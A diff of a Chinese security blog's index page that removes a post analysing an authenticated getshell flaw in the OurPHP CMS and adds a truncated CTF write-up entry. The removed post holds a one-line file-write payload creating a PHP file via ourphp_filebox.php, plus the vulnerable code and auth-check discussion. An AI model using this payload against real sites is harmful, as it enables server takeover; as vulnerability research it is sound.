@@ -247,146 +247,6 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/Ourphp后台getshell漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/18/Ourphp后台getshell漏洞/" itemprop="url">
-                  Ourphp后台getshell漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/18/Ourphp后台getshell漏洞/" class="leancloud_visitors" data-flag-title="Ourphp后台getshell漏洞">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-Payload"><a href="#0x00-Payload" class="headerlink" title="0x00 Payload"></a>0x00 Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/client/manage/ourphp_filebox.php?op=save&amp;encode=UTF-8&amp;fename=1.php&amp;ncontent=&lt;?php phpinfo(); ?&gt;</div></pre></td></tr></table></figure>
-<p>在登陆后台后，可直接上传文件。</p>
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>/ourphp/client/manage/ourphp_filebox.php 694行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($ncontent, $fename, $encode)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $meurl,$folder;</div><div class="line">    <span class="keyword">if</span> (!$fename == <span class="string">""</span>) &#123;</div><div class="line">    maintop(<span class="string">"编辑"</span>);</div><div class="line">    $file = iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>, $folder.$fename);</div><div class="line">    $ydata = stripslashes($ncontent);</div><div class="line">    <span class="keyword">if</span>($encode!==<span class="string">"UTF-8"</span> &amp;&amp; $encode!==<span class="string">"ASCII"</span>)&#123;</div><div class="line">        $ydata = iconv($encode, <span class="string">"UTF-8"</span>, $ydata);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(file_put_contents($file, $ydata)) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class='box'&gt;文件 &lt;a href=\""</span>.$folder.$fename.<span class="string">"\" target=\"_blank\"&gt;"</span>.$folder.$fename.<span class="string">"&lt;/a&gt; 保存成功！\n"</span></div><div class="line">            .<span class="string">"请选择 &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\""</span>.$meurl.<span class="string">"?op=edit&amp;fename="</span>.$fename.<span class="string">"&amp;folder="</span>.$folder.<span class="string">"\"&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\n"</span>;</div><div class="line">        $fp = <span class="keyword">null</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;span class='error'&gt;文件保存出错！&lt;/span&gt;\n"</span></div><div class="line">        .<span class="string">" &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt;\n"</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    home();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>函数调用位置:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> ($op)&#123;</div><div class="line">    ……</div><div class="line">    <span class="keyword">case</span> <span class="string">"save"</span>:</div><div class="line">    save($_REQUEST[<span class="string">'ncontent'</span>], $_REQUEST[<span class="string">'fename'</span>], $_REQUEST[<span class="string">'encode'</span>]);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
-<p>op参数位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'op'</span>]))&#123;</div><div class="line">    $op = $_REQUEST[<span class="string">'op'</span>];</div><div class="line">    session_start();</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">    $op = <span class="string">'home'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>所有参数全部都是request到的，也没有经过过滤函数，就直接拼接到了字符串中，进行了文件读写，保存。</p>
-<p>CNVD-2017-13894是前台漏洞，但是我并没有找到如何绕过验证。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'validation'</span>] == $ourphp[<span class="string">'validation'</span>] &amp;&amp; $_GET[<span class="string">'code'</span>] == $ourphp[<span class="string">'safecode'</span>])&#123;</div><div class="line">    $_SESSION[<span class="string">'ourphp_outtime'</span>] = time() + <span class="number">3600</span>; </div><div class="line">    $_SESSION[<span class="string">'ourphp_out'</span>] = <span class="string">"ourphp"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'ourphp_out'</span>]))&#123;</div><div class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">include</span> <span class="string">'ourphp_checkadmin.php'</span>;</div><div class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>].<span class="string">"templates/"</span>);</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>这里验证了validation和safecode，validation是ourphp的口令码，safecode是随机生成的32位的安全码，如果有这两个字符串也可以绕过验证。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/PicoCTF-level2-WriteUp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1619,6 +1479,143 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/26/IsccCTF WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/05/26/IsccCTF WriteUp/" itemprop="url">
+                  IsccCTF WriteUp
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-26T00:00:00+08:00">
+                2017-05-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/05/26/IsccCTF WriteUp/" class="leancloud_visitors" data-flag-title="IsccCTF WriteUp">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>在表哥的推荐下尝试了一下Iscc CTF，记录一下自己的答题过程。</p>
+<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="Wheel-Cipher"><a href="#Wheel-Cipher" class="headerlink" title="Wheel Cipher"></a>Wheel Cipher</h3><p>附件：<a href="https://github.com/Windylh/CTF/raw/master/Isccctf2017/Basic/Basic-01.zip">Basic-01.zip</a><br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/05/26/IsccCTF WriteUp/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
   </section>
 
   
@@ -1668,7 +1665,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-count">28</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
